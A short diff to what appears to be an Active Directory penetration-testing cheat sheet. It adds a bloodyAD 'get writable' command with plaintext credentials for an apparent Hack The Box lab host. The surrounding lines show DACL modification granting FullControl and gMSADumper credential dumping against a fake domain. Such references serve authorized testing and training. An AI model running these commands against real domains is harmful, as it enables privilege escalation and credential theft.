@@ -303,6 +303,9 @@ enum4linux -a target                  # Enumerate shares/users 🔍
 94. bloodyAD --host 192.168.1.100 -d fakeorg.local -u john.doe -p 'Passw0rd123!' get computers
 95. bloodyAD --host 192.168.1.100 -d fakeorg.local -u jane.smith -p 'SecurePass456@' set dacl bob.smith john.doe FullControl
 
+######################### GET WRITABLE ############################
+bloodyAD -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --host 10.129.46.96  get writable
+
 ## 8. gMSADumper (Machine Account Credential Dumping)
 96. python3 gMSADumper.py -u john.doe -p 'Passw0rd123!' -d fakeorg.local
 97. python3 gMSADumper.py -u jane.smith -p 'SecurePass456@' -d fakeorg.local --dc-ip 192.168.1.100
